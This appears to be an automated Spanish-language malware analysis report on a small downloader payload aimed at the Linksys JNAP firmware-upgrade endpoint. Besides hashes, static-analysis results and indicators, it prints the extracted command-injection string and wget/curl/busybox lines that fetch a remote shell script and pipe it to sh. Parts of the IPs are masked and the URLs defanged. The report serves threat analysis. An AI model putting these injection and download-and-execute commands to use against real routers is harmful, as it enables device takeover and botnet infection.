# 🧬 Payload Analysis

`3889be4675f4ab4a0f4568348a3e08e0e5538e878ebb11d5c9ab43496050f739`

## 📌 Resumen

Texto ASCII de 483 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s ljnap3`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91[.]92[.]40` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/3889be4675f4ab4a0f4568348a3e08e0e5538e878ebb11d5c9ab43496050f739.md](../../../../../malware-like/oraculo/downloader/3889be4675f4ab4a0f4568348a3e08e0e5538e878ebb11d5c9ab43496050f739.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3889be4675f4ab4a0f4568348a3e08e0e5538e878ebb11d5c9ab43496050f739`
- **SHA1:** `c90b9f0002aebade527ee1311c6332c929ea4d23`
- **MD5:** `47a4738a0f259b244035df5c01c96560`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 483 B |
| Entropía | 5.42 |
| Strings | 7 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd%20/tmp%3Bwget%20http://91.92.40
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap3 | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd%20/tmp%3Bwget%20http://91.92.40 | strings |
| hash | 3889be4675f4ab4a0f4568348a3e08e0e5538e878ebb11d5c9ab43496050f739 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
